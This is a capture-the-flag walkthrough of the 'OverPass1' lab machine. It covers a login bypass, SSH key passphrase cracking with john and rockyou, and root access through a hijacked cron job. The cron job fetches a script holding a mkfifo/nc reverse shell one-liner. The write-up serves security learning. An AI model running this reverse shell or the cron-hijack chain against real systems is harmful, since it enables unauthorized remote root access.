### OverPass1

export ip=10.10.81.225
Ninja - Lead Developer
Pars - Shibe Enthusiast and Emotional Support Animal Manager
Szymex - Head Of Security

The code was vulnerable in login vef at "/admin" dir, if the server dont asnwer with "Invalid Credentials" he doesn't block the acess, so, what we going to do? We will change the asnwer to something that not is "Invalid Credentials" :D

we got access to admin page and got the ssh key too.

copy and paste the key

$ touch key
$ echo "key" > key

to parse and organize the key file use ssh2john.py
$ /usr/share/john/ssh2john.py key > hashes.txt 

$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
output: james13

$ ssh -i key james@$ip 
$ cat user.txt
$ cat todo.txt
$ cat .overpass
todo.txt is task list from james, this text archive say that he uses your password program to crypt our pass and the hash is at ".overpass"
so, i just decrypt with rot47 decrypt in online page.

Result: [{"name":"System","pass":"saydrawnlyingpicture"}]

after this, we dont found anything like suid permission or sudo -l.

but with the command /etc/crontab we can see that curl get an "buildscript.sh" and executes with root privilege.
contrab is a command that performs tasks automatically at a set time interval.

"nano /etc/hosts" and then change the adress to our ip.
in your machine, go to / directory

$ mkdir downloads
$ cd downloads
$ mkdir src
$ cd src
$ touch buildscript.sh
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.0.0.0 4444 > /tmp/f" > buildscript.sh
$ cd ../../
$ sudo python3 -m http.server 80

Alt+Shift+D
$ nc -lnvp 4444
and wait :D

# cat root.txt
